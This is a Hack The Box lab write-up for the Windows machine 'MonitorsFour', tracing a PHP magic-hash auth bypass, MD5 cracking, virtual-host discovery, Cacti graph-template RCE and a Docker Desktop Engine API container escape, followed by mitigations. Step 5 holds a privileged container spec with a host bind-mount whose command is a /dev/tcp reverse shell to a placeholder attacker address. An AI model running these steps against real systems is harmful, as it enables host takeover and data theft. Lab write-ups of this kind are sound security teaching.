@@ -1,0 +1,106 @@
+HTB — MonitorsFour
+OS	Difficulty	Stack	Platform
+Windows	Easy	Docker Desktop + Nginx + PHP + Cacti	Hack The Box
+Skills demonstrated: PHP magic-hash (type-juggling) auth bypass, offline hash cracking, virtual-host discovery, Cacti authenticated RCE, Docker Desktop API container escape.
+
+Summary:
+A ?token= parameter on /user is bypassed with a PHP magic hash (a 0e… string that loose-compares equal), leaking a JSON user database of MD5 hashes. 
+Cracked credentials log into a Cacti instance found on a virtual host, and Cacti's authenticated graph-template RCE (CVE-2025-24367, affecting ≤ 1.2.28) gives a shell as www-data inside a Docker container. 
+The container reaches Docker Desktop's unauthenticated Engine API (CVE-2025-9074); creating a privileged container with the host drive bind-mounted yields root inside that container with full read/write to the Windows host filesystem, 
+which is enough to read both flags.
+
+Attack chain:
+Auth bypass: magic-hash token on /user → leaked user DB (MD5)
+Cracking: hashcat -m 0 + rockyou → credentials
+Pivot: vhost fuzzing → cacti.monitorsfour.htb → log in with reused creds
+Foothold: Cacti graph-template RCE (CVE-2025-24367) → www-data in container
+Escape: Docker Desktop Engine API (CVE-2025-9074) → privileged container + host bind-mount → host filesystem as root
+
+1. Recon:
+bash
+nmap -p- -sV -sC 10.10.11.98
+echo "10.10.11.98 monitorsfour.htb" | sudo tee -a /etc/hosts
+Port	Service
+80/tcp	Nginx (PHP app)
+5985/tcp	Microsoft HTTPAPI (WinRM)
+Directory brute-forcing surfaced /user (returns a small response gated by a ?token= parameter).
+
+2. Auth bypass — PHP magic hash:
+The /user endpoint compares a supplied token in a way vulnerable to PHP loose comparison. A "magic hash" — a string of the form 0e<digits> that PHP treats as 0 × 10^n = 0 in a loose (==) comparison — bypasses it. Candidate tokens:
+0e215962017
+0e0
+0e1
+...
+bash
+ffuf -u "http://monitorsfour.htb/user?token=FUZZ" -w magic_tokens.txt -fr "error"
+# token 0e215962017 bypassed the check
+The bypass returned a JSON user database (usernames + MD5 hashes).
+Verify against your run: the working token and the exact comparison (md5($token) == $stored vs $token == $stored) depend on the backend code. The magic-hash class is sound for a PHP app like this; just confirm the token you actually used.
+Crack the leaked MD5 hashes:
+bash
+hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
+
+3. Virtual-host discovery — Cacti:
+Directory brute-forcing did not reveal Cacti; a virtual host did:
+bash
+ffuf -u http://monitorsfour.htb/ -H "Host: FUZZ.monitorsfour.htb" \
+  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
+  -fs <root_page_size>
+# cacti.monitorsfour.htb
+Add it to /etc/hosts and log into Cacti 1.2.28 with reused credentials from the leaked database.
+
+4. Foothold — Cacti RCE (CVE-2025-24367):
+As of 2026-11-22, per the GitHub advisory and NVD: CVE-2025-24367 is an authenticated RCE in Cacti ≤ 1.2.28 (fixed in 1.2.29). 
+An authenticated user abuses graph creation / graph templates to write an arbitrary PHP script into the web root, then requests it to execute code (CVSS 8.7). Public PoCs deliver the payload via the right_axis_label field in graph_templates.php.
+Correction: the draft cited CVE-2025-34367. That ID does not match this vulnerability; the Cacti graph-template RCE for ≤ 1.2.28 is CVE-2025-24367 (digits transposed). Use the correct ID.
+Catch the shell and stabilize:
+bash
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+# www-data @ container 172.18.0.3/16
+
+5. Privilege escalation — Docker Desktop API escape (CVE-2025-9074):
+As of 2026-11-22, per Docker's advisory and NVD: CVE-2025-9074 (CVSS 9.3, CWE-668) is an SSRF/exposure flaw in Docker Desktop before 4.44.3 on Windows and macOS.
+Any container can reach the Docker Engine API at 192.168.65.7:2375 with no authentication, which allows creating new containers — including a privileged one with the host filesystem bind-mounted — and thereby escaping to the host.
+Confirm the API, then abuse it:
+bash
+curl -s http://192.168.65.7:2375/version
+Reconcile with the draft. The documented default endpoint is 192.168.65.7:2375. The draft reports that .7 returned null and that the API was found on a different host in 192.168.65.0/24 after a sweep. 
+Either the IP differed on this instance or the first probe was a method error (/version is a valid endpoint when the API is up). Record the IP that actually answered; the /24 sweep is unnecessary if .7 responds.
+Create a privileged container with the host drive mounted and execute into it (Engine API calls via curl --unix-socket-style HTTP to the exposed port):
+
+json
+{
+  "Image": "<image-present-on-host>:latest",
+  "Cmd": ["/bin/bash", "-c", "bash -i >& /dev/tcp/<attacker_ip>/<port> 0>&1"],
+  "HostConfig": { "Binds": ["/:/host"], "Privileged": true }
+}
+
+This yields root inside the new container with the host filesystem mounted at /host. On Windows Docker Desktop this is not an interactive Windows SYSTEM shell; it is container-root with read/write to the host drive, which is sufficient to read both flags.
+
+6. Flags:
+Locate the host mount (the bind-mount path can vary by setup), then read from it:
+bash
+mount | grep -i host        # find where the host drive is mounted
+ls /host                    # or /mnt/host, per the actual bind target
+# read user.txt and Administrator\Desktop\root.txt from the mounted host FS
+
+Root cause and mitigations:
+Layer	Issue	Fix
+Web auth	PHP loose comparison on a token (magic-hash bypass)	Use strict comparison (===) and hash_equals(); never compare hashes with ==
+Credentials	MD5 password hashes, rockyou-crackable, reused across services	Use a salted slow KDF (bcrypt/Argon2); eliminate credential reuse
+Cacti	Authenticated graph-template RCE, CVE-2025-24367 (≤ 1.2.28)	Upgrade Cacti to ≥ 1.2.29; restrict template-management rights
+Docker Desktop	Unauthenticated Engine API reachable from containers, CVE-2025-9074 (< 4.44.3)	Upgrade Docker Desktop to ≥ 4.44.3; do not expose the Engine API to containers
+
+Key lessons:
+A 0e… token against a PHP == check is a magic-hash bypass; confirm the comparison before assuming it applies.
+Hidden services often live on virtual hosts rather than paths — fuzz the Host header.
+Docker Desktop's container-reachable Engine API turns any in-container RCE into host compromise; the escape is a bind-mount, not a kernel exploit.
+
+References:
+Cacti CVE-2025-24367 — GitHub advisory (GHSA-fxrq-fr7h-9rqq)
+NVD — CVE-2025-24367
+Docker — CVE-2025-9074 (release notes 4.44.3)
+NVD — CVE-2025-9074
+pvotal.tech — Breaking Docker's isolation (CVE-2025-9074)
+
+Performed against a Hack The Box machine for educational purposes.
